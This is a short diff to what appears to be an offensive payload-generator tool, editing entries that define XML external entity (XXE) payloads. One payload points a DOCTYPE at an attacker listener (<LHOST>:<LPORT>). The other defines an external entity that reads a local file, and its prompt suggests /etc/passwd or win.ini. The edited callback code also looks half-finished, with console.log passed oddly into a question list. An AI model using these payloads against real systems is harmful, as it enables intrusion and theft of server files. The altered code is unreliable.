@@ -49,7 +49,7 @@ Load({
 	payload: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo PUBLIC 'bar' 'http://<LHOST>:<LPORT>'>",
 	category: "XML",
 	callback: function(returnToPrepare){
-		question.ask("Should I fire up a web server for you? (Y/n)", returnToPrepare, "web")
+		var answer1 = question.ask("Should I fire up a web server for you? (Y/n)", returnToPrepare, "web")
 	}
 })
 
@@ -59,8 +59,8 @@ Load({
 	payload: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo [ <!ENTITY bar SYSTEM \"file://<PROMPT>\"> ]]>&bar;",
 	category: "XML",
 	callback: function(returnToPrepare){
-		
-	  question.ask("Specify a local file (/etc/passwd , C:\\Windows\\win.ini)", returnToPrepare, "web")			
+	  //question.ask("Specify a local file (/etc/passwd , C:\\Windows\\win.ini)", "web")
+	  question.ask(["Question 1", "Question 2", console.log])			
 		
 	}
 })
